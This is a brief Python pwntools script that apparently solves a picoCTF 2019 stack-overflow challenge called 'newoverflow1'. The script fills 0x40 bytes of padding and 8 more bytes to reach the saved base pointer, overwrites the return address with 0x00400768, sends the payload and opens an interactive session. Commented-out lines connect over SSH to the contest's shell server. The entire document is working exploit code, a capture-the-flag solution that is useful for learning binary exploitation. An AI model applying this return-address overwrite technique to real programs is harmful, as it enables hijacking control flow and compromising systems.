from pwn import *
import time

binary = "./newoverflow1"

p = process(binary)

#passwd = input().rstrip()
#s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
#p = s.process("vuln",cwd="/problems/canary_2_dffbf795b4788666d54a993a5e41d145")

payload=b"A"*0x40
payload+=b"b"*8
payload+=p64(0x00400768) #0x10
p.sendlineafter(b"> ",payload)
p.interactive()